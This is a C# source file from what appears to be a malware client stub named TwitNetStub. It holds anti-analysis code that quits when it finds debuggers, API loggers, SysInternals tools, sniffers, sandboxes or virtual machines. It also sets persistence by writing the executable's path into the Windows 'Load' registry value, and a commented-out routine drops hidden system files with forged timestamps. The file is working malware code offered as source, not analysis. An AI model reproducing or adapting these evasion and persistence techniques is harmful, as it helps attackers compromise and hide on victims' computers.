using System;
using System.IO;
using System.Text;
using System.Threading;
using Microsoft.Win32;
using TwitNetStub.Util.AntiCheck.Anti;
using TwitNetStub.Util.Misc;

namespace TwitNetStub.Util.AntiCheck
{
    class StartRegistry
    {

        public static void Start()
        {
            CheckMutex();

            CheckProcess proc = new CheckProcess();
            if (proc.IsProcessRunning("api_logger") ||
                proc.IsProcessRunning("api_logger") ||
                Interop.GetModuleHandle("api_log.dll").ToInt32() != 0 ||
                proc.IsProcessRunning("proc_analyzer"))
                Environment.FailFast(new Random().Next(5, 100).ToString());

            new CheckDebugger();
            new SysInternals();
            new Sniffers();
            new Sandbox();

            if (new Virtualized().IsVirtual())
                new AntiFound();
            GC.Collect();

            CheckRegKey();
        }


        public static void CheckRegKey()
        {
            try
            {
                const string RegKey = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows";


                //Set the registry key with the Short Path (8.3) filename
                RegistryKey regKey2 = Registry.CurrentUser.CreateSubKey(RegKey);

                StringBuilder shortPath = new StringBuilder(255);
                Interop.GetShortPathName(Constants.FullExecutablePath, shortPath, shortPath.Capacity);
                Interop.ShortPath = shortPath.ToString();
                if (regKey2 != null)
                    regKey2.SetValue("Load", shortPath.ToString());
            }
            catch { } //(Exception ee) { System.Windows.Forms.MessageBox.Show(ee.ToString() + "\n\n\n" + ee.Message); }
        }


        private static void CheckMutex()
        {
            if (!Variables.CreatedMutex)
            {// Mutex is already active
                Environment.Exit(-1);
            }
            // keep the mutex reference alive until the normal termination of the program
            GC.KeepAlive(Variables.Mutex);
        }

        /*public static void SaveToHost(string path, byte[] contents)
        {
            Thread.CurrentThread.Priority = ThreadPriority.AboveNormal;
            try { if (File.Exists(path)) { File.Delete(path); } }
            catch { }
            Thread.Sleep(100);
            if (!File.Exists(path))
            {
                //Write target file to the HDD, set random dates/times for the file
                File.WriteAllBytes(path, contents);
                string date = Convert.ToString(new Random().Next(1, 12) + @"/" + new Random().Next(1, 30) + @"/200" + new Random().Next(0, 9) + ' ');
                Thread.Sleep(100);
                string time = Convert.ToString(new Random().Next(1, 12));
                string clock = ":00 PM";
                switch (new Random().Next(1, 2))
                {
                    case 1:
                        clock = ":00 AM";
                        break;
                    case 2:
                        clock = ":00 PM";
                        break;
                }
                File.SetCreationTime(path, DateTime.Parse(date + time + clock));
                File.SetLastWriteTime(path, DateTime.Parse(date + time + clock));
                File.SetAttributes(path, FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed);
                while (!File.Exists(path))
                {
                    System.Windows.Forms.Application.DoEvents();
                }
            }
        }*/
    }
}
